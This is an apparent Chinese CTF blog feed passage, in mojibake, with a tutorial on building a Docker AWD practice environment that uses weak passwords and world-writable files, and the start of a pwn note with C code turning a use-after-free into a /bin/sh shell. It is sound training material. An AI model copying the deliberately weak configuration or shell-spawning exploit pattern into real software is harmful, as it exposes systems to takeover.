        <content type="html"><![CDATA[<p>ÊâìÈÄ†‰∏Ä‰∏™ÈõÜwebÂíåpwn‰∫é‰∏Ä‰ΩìÁöÑAWD docker„ÄÇ</p><a id="more"></a><h1 id="ÊâìÈÄ†‰∏Ä‰∏™ÈõÜwebÂíåpwn‰∫é‰∏Ä‰ΩìÁöÑAWD-docker"><a href="#ÊâìÈÄ†‰∏Ä‰∏™ÈõÜwebÂíåpwn‰∫é‰∏Ä‰ΩìÁöÑAWD-docker" class="headerlink" title="ÊâìÈÄ†‰∏Ä‰∏™ÈõÜwebÂíåpwn‰∫é‰∏Ä‰ΩìÁöÑAWD docker"></a>ÊâìÈÄ†‰∏Ä‰∏™ÈõÜwebÂíåpwn‰∫é‰∏Ä‰ΩìÁöÑAWD docker</h1><h2 id="ÂÆâË£Ödocker"><a href="#ÂÆâË£Ödocker" class="headerlink" title="ÂÆâË£Ödocker"></a>ÂÆâË£Ödocker</h2><blockquote><p>‰πãÂâçÂ∑≤ÁªèËÆ≤ËøádockerÊÄé‰πàÂÆâË£ÖÔºåÁΩë‰∏ä‰πüÊúâÂæàÂ§öÊïôÁ®ãÔºå<code>sudo apt-get install docker.io</code>ÔºåËøôÈáåÂ∞±‰∏çËµòËø∞‰∫Ü„ÄÇ</p></blockquote><h2 id="ÊãâÂèñÂÖ∑ÊúâwebÁéØÂ¢ÉÁöÑimage"><a href="#ÊãâÂèñÂÖ∑ÊúâwebÁéØÂ¢ÉÁöÑimage" class="headerlink" title="ÊãâÂèñÂÖ∑ÊúâwebÁéØÂ¢ÉÁöÑimage"></a>ÊãâÂèñÂÖ∑ÊúâwebÁéØÂ¢ÉÁöÑimage</h2><blockquote><p>ÈÄöËøá<code>sudo docker search lamp</code>ÔºåÊàë‰ª¨ÂèØ‰ª•Êü•ÊâæÂà∞ÊúâlampÈõÜÊàêÁéØÂ¢ÉÁöÑ‰ªñ‰∫∫‰∏ä‰º†ÁöÑimageÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103224056.png" alt=""></p><p>‰∫éÊòØÊàëÈÄâÊã©‰∫Ü tutum/lampËøô‰∏™image„ÄÇ</p><p>‰ΩøÁî®ÂëΩ‰ª§Ôºö<code>sudo docker pull tutum/lamp</code>ÔºåÂ∞ÜimageÊãâÂèñÂà∞Êú¨Âú∞ÂêéÔºå‰ΩøÁî®ÂëΩ‰ª§<code>sudo docker images</code>Êü•ÁúãÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103224557.png" alt=""></p></blockquote><h2 id="Â∞ÜCTF-xinetdÊ°ÜÊû∂ÁöÑdockerfileËøõË°å‰øÆÊîπ"><a href="#Â∞ÜCTF-xinetdÊ°ÜÊû∂ÁöÑdockerfileËøõË°å‰øÆÊîπ" class="headerlink" title="Â∞ÜCTF_xinetdÊ°ÜÊû∂ÁöÑdockerfileËøõË°å‰øÆÊîπ"></a>Â∞ÜCTF_xinetdÊ°ÜÊû∂ÁöÑdockerfileËøõË°å‰øÆÊîπ</h2><blockquote><p>‰øÆÊîπÂ¶Ç‰∏ã:</p><ul><li><p>Â∞ÜÂéüÊù•ÁöÑ<code>FORM ubuntu:16.04</code>Êîπ‰∏∫<code>FROM tutum/lamp</code>Âç≥‰πãÂâçÊãâÂèñ‰∏ãÊù•ÁöÑÂÖ∑ÊúâwebÁéØÂ¢ÉÁöÑimage„ÄÇ</p></li><li><p>Ê∑ªÂä†<code>RUN apt-get -y install openssh-server</code>‰∏∫sshËøûÊé•ÂÅöÂáÜÂ§á„ÄÇ</p></li><li>Ê∑ªÂä†awdÂèÇËµõËÄÖÁî®Êà∑<code>RUN useradd -u 544  -g users -s /bin/bash -m awduser</code></li><li>Ê∑ªÂä†htmlÁõÆÂΩï‰∏ãÁöÑwebÈ¢òÊ∫êÁ†Å:<code>COPY ./html/ /var/www/html/web/</code></li><li>ÈÖçÁΩÆsshËøúÁ®ãËøûÊé•Ôºö<code>COPY ./sshd_config.txt /etc/ssh/sshd_config</code></li></ul></blockquote><pre class=" language-dockerfile"><code class="language-dockerfile">FROM tutum/lampRUN sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g" /etc/apt/sources.list && \    apt-get update && \    apt-get install -y lib32z1 xinetdRUN apt-get -y install openssh-serverRUN useradd -m ctfRUN useradd -u 544  -g users -s /bin/bash -m awduserWORKDIR /home/RUN cp -R /lib* /home/ctf && \    cp -R /usr/lib* /home/ctfRUN mkdir /home/ctf/dev && \    mknod /home/ctf/dev/null c 1 3 && \    mknod /home/ctf/dev/zero c 1 5 && \    mknod /home/ctf/dev/random c 1 8 && \    mknod /home/ctf/dev/urandom c 1 9 && \    chmod 666 /home/ctf/dev/*RUN mkdir /home/ctf/bin && \    cp /bin/sh /home/ctf/bin && \    cp /bin/ls /home/ctf/bin && \    cp /bin/cat /home/ctf/bin && \    cp /bin/bash /home/ctf/bin && \    cp /bin/nc /home/ctf/bin && \    cp /usr/bin/git /home/ctf/binCOPY ./ctf.xinetd /etc/xinetd.d/ctfCOPY ./start.sh /start.shRUN echo "Blocked by ctf_xinetd" > /etc/banner_failRUN chmod +x /start.shCOPY ./html/ /var/www/html/web/COPY ./bin/ /home/ctf/COPY ./sshd_config.txt /etc/ssh/sshd_configRUN chown -R root:ctf /home/ctf && \    chown -R awduser:users /var/www/html/* && \    chmod -R 777 /var/www/html/* && \    chmod -R 750 /home/ctf && \    chmod 740 /home/ctf/flagRUN service ssh startCMD ["/start.sh"]CMD ["/run.sh"]EXPOSE 9999</code></pre><p>ÈôÑ‰∏ässhd_configÈÖçÁΩÆÔºö</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#    $OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $</span><span class="token comment" spellcheck="true"># This is the sshd server system-wide configuration file.  See</span><span class="token comment" spellcheck="true"># sshd_config(5) for more information.</span><span class="token comment" spellcheck="true"># This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin</span><span class="token comment" spellcheck="true"># The strategy used for options in the default sshd_config shipped with</span><span class="token comment" spellcheck="true"># OpenSSH is to specify options with their default value where</span><span class="token comment" spellcheck="true"># possible, but leave them commented.  Uncommented options override the</span><span class="token comment" spellcheck="true"># default value.</span><span class="token comment" spellcheck="true">#Port 22</span><span class="token comment" spellcheck="true">#AddressFamily any</span><span class="token comment" spellcheck="true">#ListenAddress 0.0.0.0</span><span class="token comment" spellcheck="true">#ListenAddress ::</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_rsa_key</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_ecdsa_key</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_ed25519_key</span><span class="token comment" spellcheck="true"># Ciphers and keying</span><span class="token comment" spellcheck="true">#RekeyLimit default none</span><span class="token comment" spellcheck="true"># Logging</span><span class="token comment" spellcheck="true">#SyslogFacility AUTH</span><span class="token comment" spellcheck="true">#LogLevel INFO</span><span class="token comment" spellcheck="true"># Authentication:</span><span class="token comment" spellcheck="true">#LoginGraceTime 2m</span><span class="token comment" spellcheck="true">#PermitRootLogin prohibit-password</span><span class="token comment" spellcheck="true">#StrictModes yes</span><span class="token comment" spellcheck="true">#MaxAuthTries 6</span><span class="token comment" spellcheck="true">#MaxSessions 10</span><span class="token comment" spellcheck="true">#PubkeyAuthentication yes</span><span class="token comment" spellcheck="true"># Expect .ssh/authorized_keys2 to be disregarded by default in future.</span><span class="token comment" spellcheck="true">#AuthorizedKeysFile    .ssh/authorized_keys .ssh/authorized_keys2</span><span class="token comment" spellcheck="true">#AuthorizedPrincipalsFile none</span><span class="token comment" spellcheck="true">#AuthorizedKeysCommand none</span><span class="token comment" spellcheck="true">#AuthorizedKeysCommandUser nobody</span><span class="token comment" spellcheck="true"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span><span class="token comment" spellcheck="true">#HostbasedAuthentication no</span><span class="token comment" spellcheck="true"># Change to yes if you don't trust ~/.ssh/known_hosts for</span><span class="token comment" spellcheck="true"># HostbasedAuthentication</span><span class="token comment" spellcheck="true">#IgnoreUserKnownHosts no</span><span class="token comment" spellcheck="true"># Don't read the user's ~/.rhosts and ~/.shosts files</span><span class="token comment" spellcheck="true">#IgnoreRhosts yes</span><span class="token comment" spellcheck="true"># To disable tunneled clear text passwords, change to no here!</span><span class="token comment" spellcheck="true">#PasswordAuthentication yes</span><span class="token comment" spellcheck="true">#PermitEmptyPasswords no</span><span class="token comment" spellcheck="true"># Change to yes to enable challenge-response passwords (beware issues with</span><span class="token comment" spellcheck="true"># some PAM modules and threads)</span>ChallengeResponseAuthentication no<span class="token comment" spellcheck="true"># Kerberos options</span><span class="token comment" spellcheck="true">#KerberosAuthentication no</span><span class="token comment" spellcheck="true">#KerberosOrLocalPasswd yes</span><span class="token comment" spellcheck="true">#KerberosTicketCleanup yes</span><span class="token comment" spellcheck="true">#KerberosGetAFSToken no</span><span class="token comment" spellcheck="true"># GSSAPI options</span><span class="token comment" spellcheck="true">#GSSAPIAuthentication no</span><span class="token comment" spellcheck="true">#GSSAPICleanupCredentials yes</span><span class="token comment" spellcheck="true">#GSSAPIStrictAcceptorCheck yes</span><span class="token comment" spellcheck="true">#GSSAPIKeyExchange no</span><span class="token comment" spellcheck="true"># Set this to 'yes' to enable PAM authentication, account processing,</span><span class="token comment" spellcheck="true"># and session processing. If this is enabled, PAM authentication will</span><span class="token comment" spellcheck="true"># be allowed through the ChallengeResponseAuthentication and</span><span class="token comment" spellcheck="true"># PasswordAuthentication.  Depending on your PAM configuration,</span><span class="token comment" spellcheck="true"># PAM authentication via ChallengeResponseAuthentication may bypass</span><span class="token comment" spellcheck="true"># the setting of "PermitRootLogin without-password".</span><span class="token comment" spellcheck="true"># If you just want the PAM account and session checks to run without</span><span class="token comment" spellcheck="true"># PAM authentication, then enable this but set PasswordAuthentication</span><span class="token comment" spellcheck="true"># and ChallengeResponseAuthentication to 'no'.</span>UsePAM <span class="token function">yes</span><span class="token comment" spellcheck="true">#AllowAgentForwarding yes</span><span class="token comment" spellcheck="true">#AllowTcpForwarding yes</span><span class="token comment" spellcheck="true">#GatewayPorts no</span>X11Forwarding <span class="token function">yes</span><span class="token comment" spellcheck="true">#X11DisplayOffset 10</span><span class="token comment" spellcheck="true">#X11UseLocalhost yes</span><span class="token comment" spellcheck="true">#PermitTTY yes</span>PrintMotd no<span class="token comment" spellcheck="true">#PrintLastLog yes</span><span class="token comment" spellcheck="true">#TCPKeepAlive yes</span><span class="token comment" spellcheck="true">#UseLogin no</span><span class="token comment" spellcheck="true">#PermitUserEnvironment no</span><span class="token comment" spellcheck="true">#Compression delayed</span><span class="token comment" spellcheck="true">#ClientAliveInterval 0</span><span class="token comment" spellcheck="true">#ClientAliveCountMax 3</span><span class="token comment" spellcheck="true">#UseDNS no</span><span class="token comment" spellcheck="true">#PidFile /var/run/sshd.pid</span><span class="token comment" spellcheck="true">#MaxStartups 10:30:100</span><span class="token comment" spellcheck="true">#PermitTunnel no</span><span class="token comment" spellcheck="true">#ChrootDirectory none</span><span class="token comment" spellcheck="true">#VersionAddendum none</span><span class="token comment" spellcheck="true"># no default banner path</span><span class="token comment" spellcheck="true">#Banner none</span><span class="token comment" spellcheck="true"># Allow client to pass locale environment variables</span>AcceptEnv LANG LC_*<span class="token comment" spellcheck="true"># override default of no subsystems</span>Subsystem    <span class="token function">sftp</span>    /usr/lib/openssh/sftp-server<span class="token comment" spellcheck="true"># Example of overriding settings on a per-user basis</span><span class="token comment" spellcheck="true">#Match User anoncvs</span><span class="token comment" spellcheck="true">#    X11Forwarding no</span><span class="token comment" spellcheck="true">#    AllowTcpForwarding no</span><span class="token comment" spellcheck="true">#    PermitTTY no</span><span class="token comment" spellcheck="true">#    ForceCommand cvs server</span></code></pre><blockquote><p>Ê≠§Êó∂ctf_xinetdÊñá‰ª∂Â§π‰∏ãÁöÑÊÉÖÂÜµÂ§ßËá¥Â¶Ç‰∏ãÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103225916.png" alt=""></p><p>binÊñá‰ª∂Â§πÁî®‰∫éÊîæÁΩÆ pwnÈ¢òÁöÑbinaryÁ®ãÂ∫èÂíåflagÔºåhtmlÊñá‰ª∂Â§πÁî®‰∫éÊîæÁΩÆweb_phpÁéØÂ¢ÉÁöÑÊ∫êÁ†Å„ÄÇ</p></blockquote><h2 id="Docker-build"><a href="#Docker-build" class="headerlink" title="Docker build"></a>Docker build</h2><blockquote><p>ÈÖçÁΩÆÂ•Ω‰∫ÜDockerfileÔºå‰ª•ÂèäbinÊñá‰ª∂Â§πÂíåhtmlÊñá‰ª∂Â§πÂêéÔºåÈúÄË¶ÅÊ≥®ÊÑèctf_xinetdÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑbinaryÁ®ãÂ∫èÂêçÈúÄË¶Å‰∏ébinÊñá‰ª∂Â§π‰∏≠ÁöÑbinaryÁ®ãÂ∫èÂêç‰øùÊåÅ‰∏ÄËá¥ÔºåËøô‰∏™ÂèÇÁÖßctf_xinetdËØ¥Êòé‰π¶Âç≥ÂèØ„ÄÇ</p></blockquote><p>ÂàáÊç¢ÁõÆÂΩïÂà∞‰∏édockerfileÂêå‰∏ÄÁõÆÂΩïÔºåÊâßË°åÂëΩ‰ª§:<code>docker build -t imagename .</code></p><p>ÂÆû‰æãÔºö<code>docker build -t &quot;awd1test&quot; .</code></p><p>Á≠âÂæÖdockerfileÊâßË°åÂÆåÊØï‰πãÂêéÂ∞±ÂæóÂà∞‰∫Ü‰∏Ä‰∏™ÂÆöÂà∂ÁöÑimage:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103230536.png" alt=""></p><h2 id="Docker-Run"><a href="#Docker-Run" class="headerlink" title="Docker Run"></a>Docker Run</h2><blockquote><p>ÂæóÂà∞ÂÆöÂà∂ÁöÑimageÂêéÔºåÂ∞±ÊòØÁîüÊàêcontainer‰∫ÜÔºö</p><p>ÊâßË°åÂëΩ‰ª§<code>sudo docker run -d -p 18080:80 -p 13306:3306 -p 10022:22 -p 19999:9999 -h &quot;awd1test&quot; --name=&quot;awd1test&quot; awd1test</code></p><ul><li>18080:80Ë°®Á§∫ÊäädockerÁéØÂ¢ÉÁöÑ80Á´ØÂè£Êò†Â∞ÑÂà∞‰∏ªÊú∫ÁöÑ18080Á´ØÂè£</li><li>13306:3306Ë°®Á§∫ÊäädockerÁéØÂ¢ÉÁöÑmysqlÊúçÂä°Êò†Â∞ÑÂà∞‰∏ªÊú∫13306Á´ØÂè£</li><li>10022:22Ë°®Á§∫Êò†Â∞ÑsshÊúçÂä°</li><li>19999:9999Ë°®Á§∫Êò†Â∞ÑpwnÈ¢òÊúçÂä°</li></ul></blockquote><p>ÊâßË°åÂëΩ‰ª§‰πãÂêéÔºåÈÄöËøá<code>sudo docker ps</code>Êü•ÁúãÊ≠£Âú®ËøêË°åÁöÑdockerÁä∂ÊÄÅÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103231044.png" alt=""></p><h2 id="ÈÖçÁΩÆ"><a href="#ÈÖçÁΩÆ" class="headerlink" title="ÈÖçÁΩÆ"></a>ÈÖçÁΩÆ</h2><blockquote><p>ÊâßË°åÂëΩ‰ª§<code>sudo docker exec -ti 15d94d229fcb /bin/bash</code>ËøõÂÖ•ÂÆπÂô®„ÄÇ</p></blockquote><p>ËøõÂÖ•ÂÆπÂô®‰πãÂêéÈ¶ñÂÖàÔºö</p><ul><li>ÈÄöËøá<code>passwd</code>ÂëΩ‰ª§ËÆæÁΩÆrootÁî®Êà∑ÁöÑÂØÜÁ†Å‰ª•ÂèäawduserÁî®Êà∑ÁöÑÂØÜÁ†ÅÔºåÂπ∂‰∏îÂºÄÂêØsshËøúÁ®ãËøûÊé•ÊúçÂä°Ôºå‰ª•‰æøËøêÁª¥ÂíåawdÂèÇËµõËÄÖÁöÑËøûÊé•„ÄÇ</li><li>ËÆæÁΩÆÂÆåÂØÜÁ†ÅÂêéÂºÄÂêØsshÊúçÂä°==&gt;<code>service ssh start</code>„ÄÇ</li><li>ÂàùÂßãÁä∂ÊÄÅÔºåmysqlÁöÑrootË¥¶Êà∑ÊòØÊ≤°ÊúâÂØÜÁ†ÅÁöÑÔºåÊâÄ‰ª•ÈúÄË¶ÅÊâãÂä®‰∏∫rootÊ∑ªÂä†ÂØÜÁ†Å<code>mysql&gt; set password for root@localhost = password(&#39;root&#39;);</code>ÔºåÂàÜÂèëÁªôÂèÇËµõËÄÖÁöÑË¥¶Êà∑‰∏∫adminÔºåÂØÜÁ†ÅÈöèÊú∫ÁîüÊàê„ÄÇ</li><li>Ëã•ÊúâmysqlÊï∞ÊçÆÂ∫ìÈúÄË¶ÅÂä†ËΩΩÔºåÂàô‰ΩøÁî®Á±ª‰ºº<code></code>source /var/www/html/web/tcho.sql;`ÂëΩ‰ª§Êù•Âä†ËΩΩsqlËÑöÊú¨Êñá‰ª∂„ÄÇ</li><li>Ê∑ªÂä†ÂèÇËµõËÄÖÊï∞ÊçÆÂ∫ìÁî®Êà∑Ôºö<code>mysql&gt; insert into mysql.user(Host,User,Password) values(&quot;%&quot;,&quot;awduser&quot;,password(&quot;123456&quot;));</code></li></ul><p>ÂÖ≥‰∫éÂÖ∑‰ΩìÁöÑwebÈ¢òÁéØÂ¢ÉÂíåpwnÈ¢òÁéØÂ¢ÉÔºåËØ∑Ëá™Ë°åÊõ¥ÊîπÁõ∏ÂÖ≥Êñá‰ª∂„ÄÇ</p><h2 id="ÊºîÁ§∫"><a href="#ÊºîÁ§∫" class="headerlink" title="ÊºîÁ§∫"></a>ÊºîÁ§∫</h2><p>ËøêË°åËµ∑Êù•ÁöÑwebÊúçÂä°Ôºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103233718.png" class="lazyload"></p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181104005557.png" class="lazyload"></p><p>ËøêË°åÂú®Âêå‰∏ÄdockerÂÆπÂô®ÂÜÖÁöÑpwn:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103233932.png" class="lazyload"></p><blockquote><p>ËôΩÁÑ∂ÈùûÂ∏∏ÁÆÄÈôãÔºå‰ΩÜÊòØÁî®‰∫éÁªÉ‰π†ËøòÊòØË∂≥Â§üÁöÑ„ÄÇ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ÁéØÂ¢ÉÈÉ®ÁΩ≤ </tag>
            
            <tag> docker </tag>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-11Êúà02-Hitcon-ÂÖ≠</title>
      <link href="/2018/11/02/Pwn-11%E6%9C%8802-Hitcon-%E5%85%AD/"/>
      <url>/2018/11/02/Pwn-11%E6%9C%8802-Hitcon-%E5%85%AD/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Pwn-11Êúà02-Hitcon-ÂÖ≠"><a href="#Pwn-11Êúà02-Hitcon-ÂÖ≠" class="headerlink" title="Pwn-11Êúà02-Hitcon-ÂÖ≠"></a>Pwn-11Êúà02-Hitcon-ÂÖ≠</h1><blockquote><p>ËøõÂ∫¶ËøòÊòØÂ§™ÊÖ¢‰∫ÜÔºå‰∏çËÉΩÂÜçÂ¢®Ëøπ‰∏ãÂéª‰∫Üüí™ÔºÅÔºÅ</p></blockquote><h2 id="lab10-hacknote"><a href="#lab10-hacknote" class="headerlink" title="lab10-hacknote"></a>lab10-hacknote</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; ËøôÊòØ‰∏ÄÈÅì fastbin uafÂà©Áî®ÔºüfastbinÊòØ‰ªÄ‰πàÔºüuafÂèàÊòØ‰ªÄ‰πàÔºüÂèàÊòØ‰∏ÄÈÅìÊ∂®ÂßøÂäøÁöÑÈ¢òÂë¢„ÄÇÂïäÂïäÂïä‰ªéËøôÂÑøÂºÄÂßãÂ∞±Êé•Ëß¶Â†ÜËøôÁé©ÊÑèÂÑø‰∫ÜÔºÅÔºÅÔºÅ</p><p><a href="https://www.sohu.com/a/239388523_354899" target="_blank" rel="noopener">Â†ÜÊ∫¢Âá∫Â≠¶‰π†‰πãË∑Ø</a></p></blockquote><h3 id="UAF-use-after-free"><a href="#UAF-use-after-free" class="headerlink" title="UAF (use after free)"></a>UAF (use after free)</h3><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; Use after freeÔºåË∑üÂ≠óÈù¢‰∏äÁöÑÊÑèÊÄù‰∏ÄÊ†∑ÔºöÁ¨¨‰∏ÄÊ¨°Áî≥ËØ∑ÁöÑÂÜÖÂ≠òÁ©∫Èó¥Âú®ÈáäÊîæËøáÂêéÊ≤°ÊúâËøõË°åÂÜÖÂ≠òÂõûÊî∂ÔºåÂØºËá¥‰∏ãÊ¨°Áî≥ËØ∑ÂÜÖÂ≠òÁöÑÊó∂ÂÄôÂÜçÊ¨°‰ΩøÁî®ËØ•ÂÜÖÂ≠òÂùóÔºå‰ΩøÂæó‰ª•ÂâçÁöÑÂÜÖÂ≠òÊåáÈíàÂèØ‰ª•ËÆøÈóÆ‰øÆÊîπËøáÁöÑÂÜÖÂ≠ò„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ÈÇ£ÈÄöËøáUAFÊºèÊ¥ûÔºåÊàë‰ª¨ËÉΩÂπ≤ÂòõÔºåÂΩìÁÑ∂ÊòØÁõ¥Êé•getshellÔºåÈÄöËøá‰∏ãÈù¢‰∏ÄÊÆµcÁ®ãÂ∫èÔºåËøõË°åÁºñËØëÂ∞±ËÉΩgetshell‰∫ÜÔºàÁ®ãÂ∫è‰ª£Á†ÅÊù•Ëá™<a href="https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1" target="_blank" rel="noopener">4ct10nÁöÑÂçöÂÆ¢</a> ÔºâÔºö</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func_ptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">evil_fuc</span><span class="token punctuation">(</span><span class="token keyword">char</span> command<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">system</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token keyword">char</span> content<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    func_ptr <span class="token operator">*</span>p1<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>echo<span class="token punctuation">;</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hello world\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Âú®ËøôÈáåfree‰∫Üp1,‰ΩÜÂπ∂Êú™Â∞Üp1ÁΩÆÁ©∫,ÂØºËá¥ÂêéÁª≠ÂèØ‰ª•ÂÜç‰ΩøÁî®p1ÊåáÈíà</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hello again\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//p1ÊåáÈíàÊú™Ë¢´ÁΩÆÁ©∫,ËôΩÁÑ∂free‰∫Ü,‰ΩÜ‰ªçÂèØ‰ΩøÁî®.</span>    func_ptr <span class="token operator">*</span>p2<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//mallocÂú®free‰∏ÄÂùóÂÜÖÂ≠òÂêé,ÂÜçÊ¨°Áî≥ËØ∑ÂêåÊ†∑Â§ßÂ∞èÁöÑÊåáÈíà‰ºöÊääÂàöÂàöÈáäÊîæÁöÑÂÜÖÂ≠òÂàÜÈÖçÂá∫Êù•.</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//p2‰∏ép1ÊåáÈíàÊåáÂêëÁöÑÂÜÖÂ≠ò‰∏∫Âêå‰∏ÄÂú∞ÂùÄ</span>    p2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>evil_fuc<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Âú®ËøôÈáåÂ∞Üp1ÊåáÈíàÈáåÈù¢‰øùÂ≠òÁöÑechoÂáΩÊï∞ÊåáÈíàË¶ÜÁõñÊàê‰∏∫‰∫Üevil_funcÊåáÈíà.</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ÁºñËØëËøêË°åÊïàÊûúÂ¶Ç‰∏ãÔºö</p><p><img src="https://i.loli.net/2018/11/02/5bdbf64c0bcc4.png" alt=""></p></blockquote><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><blockquote><p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf" target="_blank" rel="noopener">fast binÂèÇËÄÉPDF</a></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102194003.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102194047.png" alt=""></p><p>fastbin attack ÈÄöÂ∏∏‰∏éÂ†ÜÂùóËÅîÁ≥ªÂú®‰∏ÄËµ∑ÔºåÊòØCTF‰∏≠Â∏∏ËßÅÈ¢òÂûã„ÄÇ</p><p>ÂÆö‰πâÂ¶Ç‰∏ãÔºö</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Fastbin AttackÊòØfastbinÂú®Â≠òÂÇ®ÁÆ°ÁêÜÊó∂Ôºå‰∏∫‰øùËØÅÂø´ÈÄüÂàÜÈÖçÔºåÂõûÊî∂ÂÜÖÂ≠òÁöÑÈúÄË¶ÅÔºåÂú®ÂÜÖÂ≠òÁÆ°ÁêÜÁöÑÊú∫Âà∂‰∏≠Âá∫Áé∞ÁöÑÈóÆÈ¢òÔºåËøõËÄåÈÄ†ÊàêÁöÑÊºèÊ¥ûÔºåËÉΩÂ§üÈÄöËøáÊºèÊ¥ûÊîπÂÜômain_arena‰∏äÁöÑFasbinYÊåáÈíàÊï∞ÁªÑÔºå‰ªéËÄåËé∑Âæó‚ÄúÁâπÂÆö‚ÄùÔºàÈúÄË¶ÅÊª°Ë∂≥‰∏ÄÂÆöÊù°‰ª∂ÔºâÂú∞ÂùÄÁöÑÂÜôÊùÉÈôê„ÄÇ</p><p>Ëá≥‰∫émain_arenaÔºåÂ∞±ÂºïÁî®‰∏Ä‰∏ãstackoverflowÁöÑËß£ÈáäÂíØÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102215928.png" alt=""></p><p><code>main_arena</code> is a local symbol and is specifically <strong>not exported</strong>. the list of exported symbols is controlled via the <code>Version</code> files in the glibc source tree. this is, by design, to keep people from being able to link against random symbols that glibc uses internally (so as to not pollute the namespace as is required by POSIX and other 